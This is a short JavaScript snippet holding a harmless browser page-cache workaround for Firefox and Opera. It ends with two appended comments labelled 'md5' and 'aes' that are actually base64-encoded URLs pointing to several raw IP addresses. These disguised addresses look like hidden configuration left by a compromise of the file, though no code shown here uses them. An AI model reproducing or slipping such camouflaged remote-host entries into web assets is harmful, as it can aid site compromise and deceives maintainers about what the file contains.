if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzQzLjEzNy40My4xNTA6ODAwOC8saHR0cDovLzEyMC43OC4xOTQuNzA6ODAwOC9odHRwOi8vNDMuMTM3LjQuMTMwOjgwMDgv**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/